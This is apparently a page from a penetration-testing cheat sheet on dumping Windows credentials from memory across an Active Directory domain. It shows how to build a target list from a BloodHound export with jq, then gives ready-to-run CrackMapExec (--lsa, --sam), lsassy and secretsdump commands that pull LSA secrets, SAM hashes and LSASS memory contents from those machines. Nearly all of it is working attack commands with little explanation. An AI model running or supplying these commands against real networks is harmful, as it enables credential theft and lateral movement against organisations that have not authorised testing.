<p style="text-align: right">_- last update 31/01/2023 -_</p>

# Dump secrets from memory

Before using any of the following tools, build the `targets.txt` file. For this:

1. launch bloodhound (see above)
2. find your user with the search bar
3. clic `Derivative local admin rights`
4. export the resulting graph to a json file (`extract.json`)
5. extract computer names from the json

```bash
jq -r '.nodes | .[] | select(.type == "Computer") | .label' extract.json | tee targets.txt
```

## CME

```bash
cme smb -d $DOMAIN -u $USER -p $PASS --lsa ./targets.txt
cme smb -d $DOMAIN -u $USER -p $PASS --sam ./targets.txt
```

## Lsassy

```bash
lsassy  -d $DOMAIN -u $USER -p $PASS ./targets.txt
```

## Secretsdump

```bash
secretsdump -outputfile output.txt $DOMAIN/$USER:$PASS@$TARGET
```
